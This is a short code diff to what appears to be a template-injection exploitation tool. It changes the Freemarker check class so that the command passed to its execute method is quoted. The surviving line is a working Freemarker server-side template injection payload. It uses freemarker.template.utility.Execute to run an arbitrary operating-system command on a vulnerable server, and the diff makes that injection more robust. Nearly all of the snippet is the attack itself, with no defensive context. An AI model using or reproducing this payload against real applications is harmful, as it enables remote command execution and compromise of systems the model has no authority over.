@@ -1,7 +1,7 @@
 from core.check import Check
 from utils.loggers import log
 from utils import rand
-import string
+from utils.strings import quote
 
 class Freemarker(Check):
 
@@ -35,5 +35,4 @@ class Freemarker(Check):
 
     def execute(self, command):
 
-        # TODO: quote command
-        return self.inject("""<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("%s") }""" % (command))
+        return self.inject("""<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("%s") }""" % (quote(command)))
